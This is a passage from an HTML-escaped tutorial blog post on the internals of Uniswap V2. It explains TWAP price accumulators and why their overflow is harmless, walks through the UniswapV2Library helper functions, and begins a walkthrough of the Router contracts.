&lt;p&gt;The solution is that Uniswap only stores the &lt;strong&gt;numerator&lt;&#x2F;strong&gt; of values ‚Äî &lt;strong&gt;every time a change is the liquidity ratio happens&lt;&#x2F;strong&gt; (mint, burn, swap, or sync are called), it records the new price and &lt;strong&gt;how long the previous price lasted.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_6.webp&quot;&gt;
&lt;p&gt;The variables &lt;code&gt;price0Cumulativelast&lt;&#x2F;code&gt; and &lt;code&gt;price1CumulativeLast&lt;&#x2F;code&gt; are public, so an interested party needs to &lt;strong&gt;snapshot&lt;&#x2F;strong&gt; them.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;price0CumulativeLast&lt;&#x2F;code&gt; and &lt;code&gt;price1CumulativeLast&lt;&#x2F;code&gt; are only updated on line 79, 80 there is no way to decrease them.&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;They always increase with every call to &lt;code&gt;_update&lt;&#x2F;code&gt; until they overflow.&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;limiting-the-lookback-window&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#limiting-the-lookback-window&quot; aria-label=&quot;Anchor link for: limiting-the-lookback-window&quot;&gt;&lt;strong&gt;Limiting the lookback window&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;We dont want the average price since the pool deployed. We want price in a certain amount of time.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_7.webp&quot;&gt;
&lt;p&gt;If we are only interested in prices since T4, then we want to be doing the following&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_8.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;We can get this part of the TWAP since the &lt;code&gt;priceXCumulative&lt;&#x2F;code&gt; keeps tracks from the pool deployement.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_9.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;We need to isolate the part we want.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_10.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;If we can able to snapshot the price at the end of T3, we get the value &lt;code&gt;UpToTime3&lt;&#x2F;code&gt; .&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Now we can get the cumulative price of the recent window by calculating&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;price0Cumulativelast - UpToTime3then&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;If we divide this value by the time of the recent window. We will get the price average for the recent window of time.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;This is what we are doing.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_11.webp&quot;&gt;
&lt;h2 id=&quot;only-calculating-the-last-1-hour-twap-in-solidity&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#only-calculating-the-last-1-hour-twap-in-solidity&quot; aria-label=&quot;Anchor link for: only-calculating-the-last-1-hour-twap-in-solidity&quot;&gt;&lt;strong&gt;Only calculating the last 1 hour TWAP in Solidity&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;If we want a 1 hour TWAP, we need to &lt;strong&gt;anticipate&lt;&#x2F;strong&gt; that we will need a snapshot of the accumulator one hour from now. So we need to access the public variable  &lt;code&gt;price0CumulativeLast&lt;&#x2F;code&gt; and the public function &lt;code&gt;getReserves()&lt;&#x2F;code&gt; to get the last update time, and snapshot those values&lt;&#x2F;p&gt;
&lt;p&gt;After at least 1 hour has passed, we can call &lt;code&gt;getOneHourPrice()&lt;&#x2F;code&gt; and we will access the newest value of &lt;code&gt;price0CumulativeLast&lt;&#x2F;code&gt; from Uniswap V2.&lt;&#x2F;p&gt;
&lt;p&gt;Since the time we snapshotted the old price, &lt;strong&gt;Uniswap has been updating the accumulator.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;We need to deploy a seperate contract that snapshots the cumulative prices of Uniswap to get the price for the interval of time that we want.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;The following contrac is an example contract that calculates the average TWAP price of Token0 of a pool.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;getOneHourPrice()&lt;&#x2F;code&gt; needs to be called atlease after an hour of time passed afer calling &lt;code&gt;snapshot()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;getOneHourPrice()&lt;&#x2F;code&gt; can calculate price for not only just one hour, it can call for any time interval of (1 - 3) hours.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_12.webp&quot;&gt;
&lt;h3 id=&quot;what-if-the-last-snapshot-is-over-three-hours-ago&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#what-if-the-last-snapshot-is-over-three-hours-ago&quot; aria-label=&quot;Anchor link for: what-if-the-last-snapshot-is-over-three-hours-ago&quot;&gt;&lt;strong&gt;What if the last snapshot is over three hours ago?&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The &lt;strong&gt;above contract will fail&lt;&#x2F;strong&gt; to give price when there is a case that &lt;code&gt;update()&lt;&#x2F;code&gt; function has no been called for over 3 hours .&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap V2 function &lt;code&gt;**_update**&lt;&#x2F;code&gt; is called during &lt;strong&gt;mint, burn, and swap&lt;&#x2F;strong&gt;, but &lt;strong&gt;none&lt;&#x2F;strong&gt; of those interactions &lt;strong&gt;happen&lt;&#x2F;strong&gt;, then &lt;strong&gt;&lt;code&gt;lastSnapshotTime&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; will record a time from a while ago.&lt;&#x2F;p&gt;
&lt;p&gt;In result the the &lt;code&gt;getTimeElapsed()&lt;&#x2F;code&gt; will return time which is greater than 3 hours. So, the &lt;code&gt;getOneHourPrice()&lt;&#x2F;code&gt; will be reverted due the check of second &lt;code&gt;require&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;So, to &lt;strong&gt;solve&lt;&#x2F;strong&gt; this problem &lt;strong&gt;call the sync function at the time it does a snapshot, as that will internally call _update.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_13.webp&quot;&gt;
&lt;h2 id=&quot;why-twap-must-track-two-ratios&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#why-twap-must-track-two-ratios&quot; aria-label=&quot;Anchor link for: why-twap-must-track-two-ratios&quot;&gt;&lt;strong&gt;Why TWAP must track two ratios&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The price of A with respect to B is simply A&#x2F;B and vice versa. For example, if we have 2000 USDC in the pool (ignoring decimals), and 1 Ether, then the price of 1 Ether is simply 2000 USDC &#x2F; 1 ETH.&lt;&#x2F;p&gt;
&lt;p&gt;The price of USDC, denominated in ETH, is simply that number with the numerator and denominator flipped.&lt;&#x2F;p&gt;
&lt;p&gt;However, we &lt;strong&gt;cannot&lt;&#x2F;strong&gt; just ‚Äú&lt;strong&gt;invert&lt;&#x2F;strong&gt;‚Äù one of the prices to get the other when we are accumulating pricing. Consider the following. If our price accumulator starts at 2 and adds 3, we cannot just do one over the accumulator:&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_14.webp&quot;&gt;
&lt;p&gt;However, the prices are still ‚Äúsomewhat symmetric,‚Äù hence the choice of fixed point arithmetic representation must have the same capacity for the integers and for the decimals. If Eth is 1,000 times more ‚Äúvaluable‚Äù than a USDC, then USDC is 1,000 times ‚Äúless valuable‚Äù than USDC. To store this accurately, the fixed point number should have the same size on both sides of the decimal, hence Uniswap‚Äôs choice of &lt;strong&gt;u112x112&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;pricecumulativelast-always-increases-until-it-overflows-then-keeps-going&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pricecumulativelast-always-increases-until-it-overflows-then-keeps-going&quot; aria-label=&quot;Anchor link for: pricecumulativelast-always-increases-until-it-overflows-then-keeps-going&quot;&gt;&lt;strong&gt;PriceCumulativeLast always increases until it overflows, then keeps going&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Reason why Overflow desirable&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap V2 was built before Solidity 0.8.0, thus arithmetic overflowed and underflowed by default. Correct modern implementations of the price oracle need to use the &lt;strong&gt;&lt;code&gt;unchecked&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; block to ensure everything overflows as expected.&lt;&#x2F;p&gt;
&lt;p&gt;Eventually, the priceAccumulators and the block timestamp will overflow. In that case, the previous reserve will be higher than the new reserve. When the oracle computes the change in price, they will get a negative value. However, this won‚Äôt matter due to the rules of modular arithmetic.&lt;&#x2F;p&gt;
&lt;p&gt;To make things simple let‚Äôs use an imaginary unsigned integers that overflow at 100.&lt;&#x2F;p&gt;
&lt;p&gt;We snapshot the priceAccumulator at 80 and a few transactions&#x2F;blocks later the priceAccumulator goes to 110, but it overflows to 10. We subtract 80 from 10, which gives -70. But the value is stored as an unsigned integer, so it gives -70 mod(100) which is 30. That‚Äôs the same result we would expect if it didn‚Äôt overflow (110-80=30).&lt;&#x2F;p&gt;
&lt;p&gt;This is true of all overflow boundaries, not just 100 in our example.&lt;&#x2F;p&gt;
&lt;p&gt;Overflowing the timestamp or priceAccumulator does not cause issues because of how modular arithmetic works.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;overflowing-the-timestamp&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#overflowing-the-timestamp&quot; aria-label=&quot;Anchor link for: overflowing-the-timestamp&quot;&gt;Overflowing the timestamp&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The same thing happens when we overflow the timestamp. Because we are using a uint32 to represent it, there won‚Äôt be any negative numbers. Again, let‚Äôs assume we overflow at 100 for the sake of simplicity. If we snapshot at time 98 and consult the price oracle at time 4, then 6 seconds have passed. 4 - 98 % 100 = 6, as expected.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-8-uniswapv2library&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-8-uniswapv2library&quot; aria-label=&quot;Anchor link for: chapter-8-uniswapv2library&quot;&gt;&lt;strong&gt;Chapter - 8 : UniswapV2Library&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;UniswapV2Library Code Walkthrough&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;libraries&#x2F;UniswapV2Library.sol&quot;&gt;&lt;strong&gt;Uniswap V2 Library&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt; simplifies some interactions with pair contracts and is used heavily by the Router contracts. It contains eight functions that are &lt;strong&gt;not state-changing&lt;&#x2F;strong&gt;,. They are also handy for &lt;strong&gt;integrating Uniswap V2&lt;&#x2F;strong&gt; from a smart contract.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;using-uniswapv2library&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#using-uniswapv2library&quot; aria-label=&quot;Anchor link for: using-uniswapv2library&quot;&gt;Using UniswapV2Library&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;If you want to predict how much to put into or expect out of a trade, or a sequence of trades across pairs, the UniswapV2Library is the tool to&lt;&#x2F;p&gt;
&lt;h2 id=&quot;getamountout&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#getamountout&quot; aria-label=&quot;Anchor link for: getamountout&quot;&gt;&lt;strong&gt;getAmountOut()&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Given an¬†&lt;em&gt;input&lt;&#x2F;em&gt;¬†asset amount, returns the maximum¬†&lt;em&gt;output&lt;&#x2F;em&gt;¬†amount of the other asset (accounting for fees) given reserves.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Let &lt;strong&gt;x&lt;&#x2F;strong&gt; be the incoming token, &lt;strong&gt;y&lt;&#x2F;strong&gt; be the outgoing token, &lt;code&gt;Œîx&lt;&#x2F;code&gt; be the amount coming in and &lt;code&gt;Œîy&lt;&#x2F;code&gt; be the amount going out.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_1.webp&quot;&gt;
&lt;p&gt;&lt;code&gt;Œîx&lt;&#x2F;code&gt; = &lt;code&gt;amountIn&lt;&#x2F;code&gt;* &lt;code&gt;0.997&lt;&#x2F;code&gt; (with 0.3% fee on in coming tokens)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;getamountin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#getamountin&quot; aria-label=&quot;Anchor link for: getamountin&quot;&gt;&lt;strong&gt;getAmountIn()&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Returns the minimum¬†input¬†asset amount required to buy the given¬†output¬†asset amount (accounting for fees) given reserves.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_2.jpg&quot;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_3.webp&quot;&gt;
&lt;h2 id=&quot;pairfor-and-sorttokens&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pairfor-and-sorttokens&quot; aria-label=&quot;Anchor link for: pairfor-and-sorttokens&quot;&gt;pairFor() and &lt;strong&gt;&lt;strong&gt;sortTokens()&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;pairFor()&lt;&#x2F;code&gt; Calculates the address for a pair without making any external calls. It deterministically derived from the addresses of the tokens and the address of the factory that deployed the pair using the create2 function.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;sortTokens()&lt;&#x2F;code&gt; sorts the order of tokens.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_4.webp&quot;&gt;
&lt;h2 id=&quot;getamountsout&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#getamountsout&quot; aria-label=&quot;Anchor link for: getamountsout&quot;&gt;getAmountsOut&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;If a trader supplies a sequence of pairs, (A, B), (B, C), (C, D) and iteratively calls &lt;strong&gt;getAmountOut&lt;&#x2F;strong&gt; starting with a certain amount of A, then the amount of token D that will be received can be predicted.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The smart contract doesn‚Äôt figure out the optimal sequence of pairs on its own, it needs to be told the list of pairs to calculate the chain of swaps over. This is best done off-chain.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;It doesn‚Äôt just return the final token amountOut in the chain, but the amount out at every step&lt;&#x2F;strong&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_5.png&quot;&gt;
&lt;h2 id=&quot;getamountsin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#getamountsin&quot; aria-label=&quot;Anchor link for: getamountsin&quot;&gt;getAmountsIn&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Does opposite to &lt;code&gt;getAmountsOut&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_6.png&quot;&gt;
&lt;h2 id=&quot;getreserves&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#getreserves&quot; aria-label=&quot;Anchor link for: getreserves&quot;&gt;&lt;strong&gt;getReserves()&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The function getReserves is simply a wrapper around the function &lt;strong&gt;getReserves from the Uniswap V2 pair&lt;&#x2F;strong&gt; contract except that it also removes the timestamp when the price was last updated.&lt;&#x2F;p&gt;
&lt;p&gt;Calls &lt;code&gt;getReserves&lt;&#x2F;code&gt; on the pair for the passed tokens, and returns the results sorted &lt;strong&gt;in the order that the parameters were passed in&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_7.webp&quot;&gt;
&lt;h2 id=&quot;quote&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#quote&quot; aria-label=&quot;Anchor link for: quote&quot;&gt;quote()&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Given some asset amount and reserves, returns an amount of the other asset representing equivalent value.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This function returns the price of foo denominated in bar as of the last update. &lt;strong&gt;This function should be used with care as it is vulnerable to flash loan attacks.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_8.webp&quot;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter8_9.webp&quot;&gt;
&lt;h1 id=&quot;chapter-9-routers&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-9-routers&quot; aria-label=&quot;Anchor link for: chapter-9-routers&quot;&gt;&lt;strong&gt;Chapter - 9 : Routers&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Uniswap v2 router code walkthrough&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The Router contracts provide a user-facing smart contract for&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;safely minting and burning LP tokens (adding and removing liquidity)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;safely swapping pair tokens&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;They add the ability to swap Ether by integrating with the wrapped Ether (WETH) ERC20 contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;They add the slippage related &lt;strong&gt;safety checks&lt;&#x2F;strong&gt; omitted from the core contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;They add support for fee on transfer tokens.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Router contracts part of v2-periphery contracts.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Router02 is everything Router01 does with support added for fee on transfer tokens&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;**UniswapV2Router01 should not be used any longer, because of the discovery of a¬†&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#getamountin&quot;&gt;low severity bug&lt;&#x2F;a&gt;¬†and the fact that some methods do not work with tokens that take fees on transfer.&lt;&#x2F;p&gt;
&lt;p&gt;The current recommendation is to use¬†&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-02&quot;&gt;UniswapV2Router02&lt;&#x2F;a&gt;.**&lt;&#x2F;p&gt;
&lt;h2 id=&quot;uniswapv2router01&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswapv2router01&quot; aria-label=&quot;Anchor link for: uniswapv2router01&quot;&gt;UniswapV2Router01&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;code&gt;[UniswapV2Router01](https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Router01.sol)&lt;&#x2F;code&gt;¬†is deployed at¬†&lt;code&gt;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&lt;&#x2F;code&gt;¬†on the Ethereum¬†&lt;a href=&quot;https:&#x2F;&#x2F;etherscan.io&#x2F;address&#x2F;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&quot;&gt;mainnet&lt;&#x2F;a&gt;, and the¬†&lt;a href=&quot;https:&#x2F;&#x2F;ropsten.etherscan.io&#x2F;address&#x2F;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&quot;&gt;Ropsten&lt;&#x2F;a&gt;,¬†&lt;a href=&quot;https:&#x2F;&#x2F;rinkeby.etherscan.io&#x2F;address&#x2F;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&quot;&gt;Rinkeby&lt;&#x2F;a&gt;,¬†&lt;a href=&quot;https:&#x2F;&#x2F;goerli.etherscan.io&#x2F;address&#x2F;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&quot;&gt;G√∂rli&lt;&#x2F;a&gt;, and¬†&lt;a href=&quot;https:&#x2F;&#x2F;kovan.etherscan.io&#x2F;address&#x2F;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&quot;&gt;Kovan&lt;&#x2F;a&gt;¬†testnets. It was built from commit¬†&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;tree&#x2F;2ad7da28a6f70ec4299364bc1608af8f30e7646b&quot;&gt;2ad7da2&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Functions:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;swapExactTokensForTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapTokensForExactTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapExactETHForTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapTokensForExactETH()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapExactTokensForETH()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapETHForExactTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;_swap()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;_addLiquidity()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;addLiquidity()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;addLiquidityETH()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;removeLiquidity()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;removeLiquidityETH()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;removeLiquidityWithPermit()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;removeLiquidityETHWithPermit()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Read only functions : factory(), WETH()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;UniswapV2Library functions&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;swapexacttokensfortokens&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swapexacttokensfortokens&quot; aria-label=&quot;Anchor link for: swapexacttokensfortokens&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#swapexacttokensfortokens&quot;&gt;swapExactTokensForTokens()&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;In &lt;strong&gt;&lt;code&gt;swapExactTokensForTokens&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; the &quot;&lt;strong&gt;first token is exact&lt;&#x2F;strong&gt;&quot; means that the amount of the &lt;strong&gt;input&lt;&#x2F;strong&gt; token you are swapping is a &lt;strong&gt;fixed&lt;&#x2F;strong&gt; quantity.&lt;&#x2F;p&gt;
&lt;p&gt;The first element of path is the input token, the last is the output token, and any intermediate elements represent intermediate pairs to trade through (if, for example, a direct pair does not exist).&lt;&#x2F;p&gt;
&lt;p&gt;In the case of swap&lt;strong&gt;Exact&lt;&#x2F;strong&gt;TokensForTokens, &lt;strong&gt;the user specifies exactly how much of the first token they are going to deposit and the minimum amount of the output token they will accept&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;For example&lt;&#x2F;strong&gt;, suppose we want to trade 25 token0 for 50 token1. If this is the exact price at the current state, this leaves no tolerance for the price changing before our transaction is confirmed, leading to a revert. So we instead specify the minimum out to be 49.5 token1, implicitly leaving a 1% tolerance.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;**msg.sender&lt;&#x2F;code&gt;¬†should have already given the router an allowance of at least amountIn on the input token.**&lt;&#x2F;p&gt;
&lt;h3 id=&quot;swaptokensforexacttokens&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swaptokensforexacttokens&quot; aria-label=&quot;Anchor link for: swaptokensforexacttokens&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#swaptokensforexacttokens&quot;&gt;swapTokensForExactTokens()&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;In &lt;strong&gt;&lt;code&gt;swapTokensForExactTokens&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;, the &lt;strong&gt;&quot;second token is exact&quot;&lt;&#x2F;strong&gt; indicates that the amount of the &lt;strong&gt;output&lt;&#x2F;strong&gt; token you want to receive is a &lt;strong&gt;fixed&lt;&#x2F;strong&gt; quantity.&lt;&#x2F;p&gt;
&lt;p&gt;In this case we specify we want exactly 50 token1, but we are willing to trade up to 25.5 token0 to obtain in.&lt;&#x2F;p&gt;
